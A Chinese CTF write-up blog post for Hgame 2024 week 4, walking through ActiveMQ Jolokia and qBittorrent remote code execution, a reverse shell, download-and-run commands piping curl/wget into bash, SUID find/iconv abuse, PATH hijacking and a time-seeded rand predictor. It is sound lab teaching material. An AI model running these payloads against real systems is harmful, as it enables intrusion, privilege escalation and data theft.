

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
  <link rel="icon" href="/img/I.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Infernity">
  <meta name="keywords" content="">
  
    <meta name="description" content="by:Infernity Reverse and Escalation.一个find提权闹麻了 这道题是ActiveMQ Jolokia 后台代码执行漏洞 https:&#x2F;&#x2F;blog.csdn.net&#x2F;huangyongkang666&#x2F;article&#x2F;details&#x2F;134814554 去github上下载一个poc  然后打入命令 1python3 poc.py -u admin -p admin">
<meta property="og:type" content="article">
<meta property="og:title" content="Hgame 2024 week 4">
<meta property="og:url" content="http://example.com/2024/02/20/Hgame-2024-week-4/index.html">
<meta property="og:site_name" content="Infernity&#39;s Blog">
<meta property="og:description" content="by:Infernity Reverse and Escalation.一个find提权闹麻了 这道题是ActiveMQ Jolokia 后台代码执行漏洞 https:&#x2F;&#x2F;blog.csdn.net&#x2F;huangyongkang666&#x2F;article&#x2F;details&#x2F;134814554 去github上下载一个poc  然后打入命令 1python3 poc.py -u admin -p admin">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/Hgame_2024/HgameCTF2024.png">
<meta property="article:published_time" content="2024-02-20T08:19:35.000Z">
<meta property="article:modified_time" content="2025-01-20T02:31:41.709Z">
<meta property="article:author" content="Infernity">
<meta property="article:tag" content="WPs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/Hgame_2024/HgameCTF2024.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>Hgame 2024 week 4 - Infernity&#39;s Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Infernity&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/friends/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>friends</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle">Hgame 2024 week 4</span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-02-20 16:19" pubdate>
          2024年2月20日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.5k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          13 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">Hgame 2024 week 4</h1>
            
            
              <div class="markdown-body">
                
                <p>by:Infernity</p>
<h1 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a><strong>Reverse and Escalation.</strong></h1><p><strong>一个find提权闹麻了</strong></p>
<p>这道题是ActiveMQ Jolokia 后台代码执行漏洞</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/huangyongkang666/article/details/134814554">https://blog.csdn.net/huangyongkang666/article/details/134814554</a></p>
<p>去github上下载一个poc</p>
<p><img src="/img/Hgame_2024/23.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>然后打入命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 poc.py -u admin -p admin http://47.102.184.100:31838/<br></code></pre></td></tr></table></figure>

<p>等待处理完毕后进入&#x2F;admin&#x2F;shell.jsp?cmd&#x3D;</p>
<p>然后就可以执行命令了，查看flag发现没权限，用suid提权试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure>

<p>这里用第三条才行，其他两条不行。</p>
<p>执行发现find有root权限，那直接用find执行命令。.</p>
<p><img src="/img/Hgame_2024/24.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find /flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag ;<br></code></pre></td></tr></table></figure>

<p><img src="/img/Hgame_2024/25.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p><strong>hgame{961c3bf5c7a186ed8e39174ccf248b1aee228479}</strong></p>
<h1 id="Reverse-and-Escalation-II"><a href="#Reverse-and-Escalation-II" class="headerlink" title="Reverse and Escalation II."></a><strong>Reverse and Escalation II.</strong></h1><p><strong>我得坐起来跟他打.gif</strong>                                                 <strong>感谢M1sery</strong></p>
<p>承接上一道题，这道题的find命令没法正常使用，所以不能用find执行命令的方式读出flag。在得到&#x2F;admin&#x2F;shell.jsp?cmd&#x3D;后，发现使用find命令会让我们回答一个计算题，但是时间只在瞬息之间，手打不可能，必须用脚本。</p>
<p>这里第一步需要先反弹shell，才好操作。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BOHB-yunying/p/15523680.html">https://www.cnblogs.com/BOHB-yunying/p/15523680.html</a></p>
<p>普通的反弹shell语句都不可以，这篇文章提到了java中利用Runtime.getRuntime().exec来反弹shell，这里前面语句可能就是这个，所以尝试把这个语句传参打入:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&#125;|&#123;<span class="hljs-built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;<br></code></pre></td></tr></table></figure>

<p>测试后发现不行，那就把这段语句保存为一个文件，例如shell</p>
<p>然后把这个shell文件上传到自己的服务器(位置是&#x2F;var&#x2F;www&#x2F;html&#x2F;)，再通过题目服务器自带的wget命令下载到题目服务器的网站根目录上，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://47.xxx.xxx.xx/shell<br></code></pre></td></tr></table></figure>

<p>这样还是不能执行shell文件，因为你ls -al发现shell的权限不够，那我们就需要给它升级权限，利用命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 ./shell<br></code></pre></td></tr></table></figure>

<p>这里就得到了一个可执行的shell，然后我们回到&#x2F;admin&#x2F;shell.jsp页面，在服务器上开启监听，执行shell文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/admin/shell.jsp?cmd=./shell<br></code></pre></td></tr></table></figure>

<p>到这里反弹shell成功。</p>
<p>最开始我写了个bash脚本回答它给的问题，但是每次都是错误的，那可能find的内部逻辑不正确，我们把&#x2F;user&#x2F;bin&#x2F;find这个程序下载到本地，拖到ida里逆出来拿到它的内部代码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>    <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br>    <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>    v3 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>);  <span class="hljs-comment">//返回当前时间</span><br>    <span class="hljs-built_in">srand</span>(v3);  <span class="hljs-comment">//设置随机数种子</span><br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt; argc; ++i )<br>    &#123;<br>        v7 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;<br>        v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d + %d = \n&quot;</span>, v7, v6);<br>        <span class="hljs-keyword">if</span> ( v7 + v6 != <span class="hljs-built_in">atoi</span>(argv[i]) )<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wrong answer!&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>        v4 = <span class="hljs-built_in">atoi</span>(argv[i]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d correct!\n&quot;</span>, v4);<br>        <span class="hljs-keyword">if</span> ( ++v9 &gt; <span class="hljs-number">38</span> )<br>        &#123;<br>            <span class="hljs-built_in">setuid</span>(<span class="hljs-number">0</span>);    <span class="hljs-comment">//权限升级</span><br>            <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>审计代码才发现，这里就是在我们执行find的时候，要回答随机数组成的39个问题，然后就会以root的权限执行system(“ls”);</p>
<p>而这里是以时间为种子的随机数，是伪随机数，我们可以自己写个脚本，把时间提前一点，得到的序列把39个答案卡好时间传给find就可以了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">int</span> v9;<br><br>    v3 = time(<span class="hljs-number">0LL</span>);<br>    srand(v3 + <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;v3: %d\n&quot;</span>, v3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;/usr/bin/find &quot;</span>);<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">40</span>; ++i)<br>    &#123;<br>        v7 = rand() % <span class="hljs-number">23333</span>;<br>        v6 = rand() % <span class="hljs-number">23333</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, v7 + v6);<br>        <span class="hljs-keyword">if</span> (++v9 &gt; <span class="hljs-number">38</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里是提前了10s，会生成39个答案</p>
<p><img src="/img/Hgame_2024/26.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>我们就把这一段，直接复制到我们反弹shell的终端里，卡好10s时间，多打几次，就能成功。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/find 36230 11291 17094 25946 11960 9219 19755 17043 13268 25972 20122 25497 25726 11857 7919 28246 3433 4614 10100 9660 3632 20753 19857 14603 25764 7183 5291 15056 18010 11073 22600 16287 21642 17812 31136 19806 7802 23533 9086<br></code></pre></td></tr></table></figure>

<p>但是刚刚说了，这里39次成功后，系统执行的是ls命令，我们如何修改这个部分拿到flag呢。</p>
<p>这里就需要我们写一个名为ls的可执行文件，把它放到&#x2F;tmp目录里，然后把&#x2F;tmp目录，放在$PATH环境变量的最前面，这样系统执行system(“ls”)的时候，就会在环境变量的第一个也就是&#x2F;tmp目录里去找我们写的ls可执行程序，来读取flag。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    FILE *fp;<br>    <span class="hljs-type">char</span> c;<br><br>    fp = fopen(<span class="hljs-string">&quot;/flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">while</span> ((c = fgetc(fp)) != EOF)<br>    &#123;<br>        <span class="hljs-built_in">putchar</span>(c);<br>    &#125;<br>    fclose(fp);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个是ls源码，我们把它静态编译成可执行程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -static -o <span class="hljs-built_in">ls</span> ls.c<br></code></pre></td></tr></table></figure>

<p>这样就会在我们的linux上创建一个名为ls的可执行程序。我们把它上传到我们的服务器上，在利用wget下载到题目服务器的&#x2F;tmp目录里。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -P /tmp http://47.xxx.xxx.xx/ls<br></code></pre></td></tr></table></figure>

<p>然后把&#x2F;tmp目录，放在$PATH环境变量的最前面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>

<p>一切准备就绪，执行我们的find，拿到密码序列，然后卡时间打入find。</p>
<p><img src="/img/Hgame_2024/27.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>时间不好卡，算好提前量多发几次。</p>
<p><img src="/img/Hgame_2024/28.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>成功后拿到flag。</p>
<p><strong>hgame{f288b31a0ca16ed51e49021c7be9ee7b614162b2}</strong></p>
<h1 id="Whose-Home"><a href="#Whose-Home" class="headerlink" title="Whose Home?"></a>Whose Home?</h1><p><img src="/img/Hgame_2024/29.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>打开是qb的web ui 登录页面，这种一般是有默认账号和密码的，我们去网上搜搜。账户admin，密码adminadmin</p>
<p>登录进来后，我们了解到版本是4.5.5我们去网上搜搜关于这个版本的漏洞。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/qbittorrent/qBittorrent/issues/18731">https://github.com/qbittorrent/qBittorrent/issues/18731</a></p>
<p>qb的后台可以rce。</p>
<p><img src="/img/Hgame_2024/30.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>在额外设置这里可以添加我们的rce代码。</p>
<p><img src="/img/Hgame_2024/31.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>尝试直接反弹shell不行后，我们就直接拿文章中的payload。</p>
<p>先把反弹shell的命令放到我们的服务器上，我保存为1.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/47.xxx.xx.xxx/2333 0&gt;&amp;1&#x27;</span><br></code></pre></td></tr></table></figure>

<p>然后把payload输入进去。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;(curl -s -L http://47.xxx.xx.xxx/1.sh || wget -O - http://47.xxx.xx.xxx/1.sh) | bash -s&quot;</span><br></code></pre></td></tr></table></figure>

<p>在我们的服务器上开启监听，然后随便添加个种子链接下载，比如这个magnet:?xt&#x3D;urn:btih:99986864CEF6A163775C8E9DBB662A93B05B9948</p>
<p>拿到了shell。</p>
<p><img src="/img/Hgame_2024/32.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>但是我们发现flag没有权限去读</p>
<p><img src="/img/Hgame_2024/33.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>看看有什么suid提权。从中可以看到iconv存在suid权限</p>
<p><img src="/img/Hgame_2024/34.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p>iconv如果存在suid权限，可以导致读取任意文件。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LFILE</span>=/flag &amp;&amp; iconv -f ISO-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span> -t UTF-<span class="hljs-number">8</span> <span class="hljs-string">&quot;$LFILE&quot;</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/Hgame_2024/35.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
<p><strong>hgame{a81ebbed09bcfa55d3b87079c5731d43a80cfed9}</strong></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Hgame 2024 week 4</div>
      <div>http://example.com/2024/02/20/Hgame-2024-week-4/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Infernity</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年2月20日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4ctf-2024/" title="青少年ctf 2024">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">青少年ctf 2024</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">
                        <span class="hidden-mobile">SICTF Round#3</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
